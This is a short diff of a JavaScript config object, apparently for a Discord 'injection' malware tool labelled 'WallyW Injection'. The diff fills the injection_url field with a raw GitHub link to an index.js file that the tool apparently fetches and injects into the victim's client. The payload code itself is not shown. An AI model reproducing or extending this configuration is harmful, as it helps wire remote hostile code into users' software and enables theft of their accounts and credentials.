@@ -14,7 +14,7 @@ const config = {
   embed_name: 'WallyW Injection', 
   embed_icon: 'https://cdn.discordapp.com/emojis/1086762567562711171.png'.replace(/ /g, '%20'), 
   embed_color: 2303786, 
-  injection_url: '', 
+  injection_url: 'https://raw.githubusercontent.com/69WallyW69/WHAT/main/index.js', 
   /**
    
    **/
